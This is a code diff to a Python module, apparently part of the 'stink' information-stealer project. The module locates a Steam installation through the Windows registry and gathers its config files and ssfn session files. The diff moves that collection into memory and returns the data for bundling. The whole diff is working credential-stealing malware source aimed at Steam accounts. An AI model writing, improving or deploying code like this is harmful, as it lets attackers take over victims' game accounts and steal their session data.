@@ -1,30 +1,19 @@
 from re import findall
-from shutil import copy
-from os import listdir, makedirs, path
-from typing import Optional
+from os import listdir, path
+from typing import Optional, List
 from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY
+
+from stink.helpers import MemoryStorage
 
 
 class Steam:
     """
     Collects configs from the Steam.
     """
-    def __init__(self, storage_path: str, folder: str):
+    def __init__(self, folder: str):
 
-        self.__full_path = path.join(storage_path, folder)
-
-    def __create_folder(self) -> None:
-        """
-        Creates storage for the Steam module.
-
-        Parameters:
-        - None.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(self.__full_path):
-            makedirs(self.__full_path)
+        self.__folder = folder
+        self.__storage = MemoryStorage()
 
     @staticmethod
     def __get_steam_path() -> Optional[str]:
@@ -62,20 +51,20 @@ class Steam:
         steam_path = self.__get_steam_path()
 
         if not steam_path:
-            print(f"[Steam]: No steam found")
+            print(f"[Steam]: No Steam found")
             return
 
         configs = [file for file in listdir(rf"{steam_path}\config") if file != "avatarcache"]
 
         for config in configs:
-            copy(rf"{steam_path}\config\{config}", self.__full_path)
+            self.__storage.add_from_disk(path.join(steam_path, "config", config), path.join(self.__folder, config))
 
         ssfns = sum([findall(r"ssfn.*", file) for file in listdir(steam_path)], [])
 
         for ssfn in ssfns:
-            copy(rf"{steam_path}\{ssfn}", self.__full_path)
+            self.__storage.add_from_disk(path.join(steam_path, ssfn), path.join(self.__folder, ssfn))
 
-    def run(self) -> None:
+    def run(self) -> List:
         """
         Launches the Steam collection module.
 
@@ -87,8 +76,9 @@ class Steam:
         """
         try:
 
-            self.__create_folder()
             self.__get_steam_files()
+
+            return self.__storage.get_data()
 
         except Exception as e:
             print(f"[Steam]: {repr(e)}")
